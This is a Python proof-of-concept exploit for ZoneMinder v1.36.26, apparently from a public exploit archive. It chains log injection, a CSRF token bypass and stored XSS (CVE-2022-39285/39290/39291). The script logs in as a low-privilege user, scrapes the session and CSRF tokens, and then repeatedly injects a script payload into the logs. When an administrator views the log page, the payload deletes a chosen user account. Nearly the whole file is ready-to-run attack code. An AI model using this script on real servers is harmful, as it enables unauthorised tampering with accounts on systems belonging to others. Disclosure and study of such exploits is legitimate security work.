@@ -1,0 +1,77 @@
+id: 38318
+date: 03/27/2023
+title: Zoneminder < v1.37.24 - Log Injection & Stored XSS & CSRF Bypass Exploit
+author: Trenches of IT
+cves: CVE-2022-39291, CVE-2022-39290, CVE-2022-39285
+
+# Exploit Title: Zoneminder v1.36.26 - Log Injection -> CSRF Bypass -> Stored Cross-Site Scripting (XSS)
+# Exploit Author: Trenches of IT
+# Vendor Homepage: https://github.com/ZoneMinder/zoneminder
+# Version: v1.36.26
+# Tested on: Linux/Windows
+# CVE: CVE-2022-39285, CVE-2022-39290, CVE-2022-39291 
+# Writeup: https://www.trenchesofit.com/2022/09/30/zoneminder-web-app-testing/
+#
+# Proof of Concept:
+# 1 - The PoC injects a XSS payload with the CSRF bypass into logs. (This action will repeat every second until manually stopped)
+# 2 - Admin user logs navigates to http://<target>/zm/index.php?view=log
+# 3 - XSS executes delete function on target UID (user).
+
+import requests
+import re
+import time
+import argparse
+import sys
+
+def getOptions(args=sys.argv[1:]):
+    parser = argparse.ArgumentParser(description="Trenches of IT Zoneminder Exploit PoC", epilog="Example: poc.py -i 1.2.3.4 -p 80 -u lowpriv -p lowpriv -d 1")
+    parser.add_argument("-i", "--ip", help="Provide the IP or hostname of the target zoneminder server. (Example: -i 1.2.3.4", required=True)
+    parser.add_argument("-p", "--port", help="Provide the port of the target zoneminder server. (Example: -p 80", required=True)
+    parser.add_argument("-zU", "--username", help="Provide the low privileged username for the target zoneminder server. (Example: -zU lowpriv", required=True)
+    parser.add_argument("-zP", "--password", help="Provide the low privileged password for the target zoneminder server. (Example: -zP lowpriv", required=True)
+    parser.add_argument("-d", "--deleteUser", help="Provide the target user UID to delete from the target zoneminder server. (Example: -d 7", required=True)
+    options = parser.parse_args(args)
+    return options
+
+options = getOptions(sys.argv[1:])
+
+payload = "http%3A%2F%2F" + options.ip + "%2Fzm%2F</td></tr><script src='/zm/index.php?view=options&tab=users&action=delete&markUids[]=" + options.deleteUser + "&deleteBtn=Delete'</script>"
+
+#Request to login and get the response headers
+loginUrl = "http://" + options.ip + ":" + options.port + "/zm/index.php?action=login&view=login&username="+options.username+"&password="+options.password
+loginCookies = {"zmSkin": "classic", "zmCSS": "base", "zmLogsTable.bs.table.pageNumber": "1", "zmEventsTable.bs.table.columns": "%5B%22Id%22%2C%22Name%22%2C%22Monitor%22%2C%22Cause%22%2C%22StartDateTime%22%2C%22EndDateTime%22%2C%22Length%22%2C%22Frames%22%2C%22AlarmFrames%22%2C%22TotScore%22%2C%22AvgScore%22%2C%22MaxScore%22%2C%22Storage%22%2C%22DiskSpace%22%2C%22Thumbnail%22%5D", "zmEventsTable.bs.table.searchText": "", "zmEventsTable.bs.table.pageNumber": "1", "zmBandwidth": "high", "zmHeaderFlip": "up", "ZMSESSID": "f1neru6bq6bfddl7snpjqo6ss2"}
+loginHeaders = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+options.ip, "Connection": "close", "Referer": "http://"+options.ip+"/zm/index.php?view=login", "Upgrade-Insecure-Requests": "1"}
+response = requests.post(loginUrl, headers=loginHeaders, cookies=loginCookies)
+zmHeaders = response.headers
+try:
+    zoneminderSession = re.findall(r'ZMSESSID\=\w+\;', str(zmHeaders))
+    finalSession = zoneminderSession[-1].replace('ZMSESSID=', '').strip(';')
+except:
+    print("[ERROR] Ensure the provided username and password is correct.")
+    sys.exit(1)
+print("Collected the low privilege user session token: "+finalSession)
+
+#Request using response headers to obtain CSRF value
+csrfUrl = "http://"+options.ip+":"+options.port+"/zm/index.php?view=filter"
+csrfCookies = {"zmSkin": "classic", "zmCSS": "base", "zmLogsTable.bs.table.pageNumber": "1", "zmEventsTable.bs.table.columns": "%5B%22Id%22%2C%22Name%22%2C%22Monitor%22%2C%22Cause%22%2C%22StartDateTime%22%2C%22EndDateTime%22%2C%22Length%22%2C%22Frames%22%2C%22AlarmFrames%22%2C%22TotScore%22%2C%22AvgScore%22%2C%22MaxScore%22%2C%22Storage%22%2C%22DiskSpace%22%2C%22Thumbnail%22%5D", "zmEventsTable.bs.table.searchText": "", "zmEventsTable.bs.table.pageNumber": "1", "zmBandwidth": "high", "zmHeaderFlip": "up", "ZMSESSID": '"' + finalSession + '"'}
+csrfHeaders = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://"+options.ip+"/zm/index.php?view=montagereview&fit=1&minTime=2022-09-30T20:52:58&maxTime=2022-09-30T21:22:58&current=2022-09-30%2021:07:58&displayinterval=1000&live=0&scale=1&speed=1", "Upgrade-Insecure-Requests": "1"}
+response = requests.get(csrfUrl, headers=csrfHeaders, cookies=csrfCookies)
+zmBody = response.text
+extractedCsrfKey = re.findall(r'csrfMagicToken\s\=\s\"key\:\w+\,\d+', str(zmBody))
+finalCsrfKey = extractedCsrfKey[0].replace('csrfMagicToken = "', '')
+print("Collected the CSRF key for the log injection request: "+finalCsrfKey)
+print("Navigate here with an admin user: http://"+options.ip+"/zm/index.php?view=log")
+
+while True:
+    
+    #XSS Request
+    xssUrl = "http://"+options.ip+"/zm/index.php"
+    xssCookies = {"zmSkin": "classic", "zmCSS": "base", "zmLogsTable.bs.table.pageNumber": "1", "zmEventsTable.bs.table.columns": "%5B%22Id%22%2C%22Name%22%2C%22Monitor%22%2C%22Cause%22%2C%22StartDateTime%22%2C%22EndDateTime%22%2C%22Length%22%2C%22Frames%22%2C%22AlarmFrames%22%2C%22TotScore%22%2C%22AvgScore%22%2C%22MaxScore%22%2C%22Storage%22%2C%22DiskSpace%22%2C%22Thumbnail%22%5D", "zmEventsTable.bs.table.searchText": "", "zmEventsTable.bs.table.pageNumber": "1", "zmBandwidth": "high", "zmHeaderFlip": "up", "ZMSESSID": finalSession}
+    xssHeaders = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://"+options.ip, "Connection": "close", "Referer": "http://"+options.ip+"/zm/index.php?view=filter"}
+    xssData = {"__csrf_magic": finalCsrfKey , "view": "request", "request": "log", "task": "create", "level": "ERR", "message": "Trenches%20of%20IT%20PoC", "browser[name]": "Firefox", "browser[version]": "91.0", "browser[platform]": "UNIX", "file": payload, "line": "105"} 
+    response = requests.post(xssUrl, headers=xssHeaders, cookies=xssCookies, data=xssData)
+    print("Injecting payload: " + response.text)
+
+    time.sleep(1)
+
+#  0day.today [2023-04-03]  #
